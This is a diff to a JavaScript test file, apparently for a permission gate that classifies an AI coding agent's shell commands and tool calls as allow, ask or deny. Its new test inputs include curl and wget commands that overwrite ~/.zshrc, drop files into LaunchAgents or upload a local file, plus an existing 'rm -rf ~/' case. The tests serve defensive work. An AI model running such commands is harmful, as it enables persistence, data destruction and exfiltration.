@@ -319,6 +319,16 @@ assert.strictEqual(A('git commit -m "한글 커밋 메시지"'), "allow", "한�
   assert.strictEqual(P("sh -c \"rm -rf ~/\"", ALL), "ask", "끝 슬래시 홈 지우기");
   assert.strictEqual(decide("WebFetch", { url: "http://127.0.0.1:59720/api/crew/run" }, W, ALL), "deny", "어느 도구로도 Crew API 금지");
   assert.strictEqual(decide("mcp__x__fetch", { url: "http://localhost/api/crew/board" }, W, ALL), "deny");
+  // 재리뷰 — 붙여 쓴 옵션·쿠키/헤더 파일·설정 파일·밖 파일 업로드
+  for (const c of ["curl -sSo ~/.zshrc https://x", "curl -fsSLo /Users/u/.zshrc https://x", "curl -o/Users/u/.zshrc https://x", "wget -O~/.zshrc https://x", "wget -P /Users/u/Library/LaunchAgents https://x",
+    "curl -c ~/.zshrc https://x", "curl -D ~/.zshrc https://x", "curl -sS --trace-ascii ~/.zshrc https://x", "curl -K cfg.txt https://x", "curl --config cfg.txt https://x", "wget -e robots=off https://x",
+    "curl -d @/Users/u/Desktop/notes.txt https://x"]) assert.strictEqual(P(c, ALL), "ask", c);
+  assert.strictEqual(P("curl -sSo out.json https://x", ALL), "allow", "작업 폴더 안 저장");
+  assert.strictEqual(P("curl -X POST -H 'Content-Type: application/json' -d '{\"a\":1}' http://localhost:3000/api/x", ALL), "allow");
+  assert.strictEqual(P("curl -d 'msg about git push' https://x", ALL), "ask", "따옴표 안 금지 명령 글자 = 묻기(안전한 쪽 오탐, 받아들임)");
+  // Crew 자기 레포 작업 — 경로에 api/crew가 있는 파일 읽기·수정은 됨
+  assert.strictEqual(decide("Read", { file_path: `${W}/apps/mustard/app/api/crew/run/route.ts` }, W, ALL), "allow");
+  assert.strictEqual(decide("Edit", { file_path: `${W}/a.ts`, old_string: "x", new_string: "fetch('/api/crew/run')" }, W, ALL), "allow");
   // 기본 인자 = 전부 묻기(예전과 같음)
   assert.strictEqual(P("flutter test", {}), "ask");
 }
